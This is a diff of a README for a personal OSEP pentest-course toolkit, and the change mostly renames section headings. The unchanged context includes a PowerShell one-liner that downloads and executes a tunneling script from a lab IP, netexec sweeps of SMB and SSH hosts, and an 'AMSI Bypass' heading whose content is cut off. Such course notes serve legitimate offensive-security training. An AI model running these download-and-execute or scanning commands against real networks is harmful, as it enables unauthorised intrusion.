@@ -1,8 +1,9 @@
 Just a bunch of tools built/gathered along the OSEP course.
 
 1. [Tunneling](#Tunneling)
-2. [Map the network](#Map the network)
-
+2. [MapTheNetwork](#MapTheNetwork)
+3. [AMSI-Bypass](#AMSI-Bypass)
+4. [Useful Basic Commands](#UsefulBasicCommands)
 
 
 # Tunneling
@@ -16,7 +17,7 @@ Make sure you are running as x64 bit process before running:
 Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
 
-# Map the network
+# MapTheNetwork
 - `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)
 
 - `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)
@@ -26,7 +27,7 @@ Automation for `/etc/hosts` file:
 netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && cat hosts.txt | awk '{print $9,$11,$11"."$21}' | sed 's/(domain://g' | sed 's/)//g' | uniq | sort -u | tr '[:upper:]' '[:lower:]' | sudo tee -a /etc/hosts
 ```
 
-# AMSI Bypass
+# AMSI-Bypass
 
 - Windows 10/11:
 ```
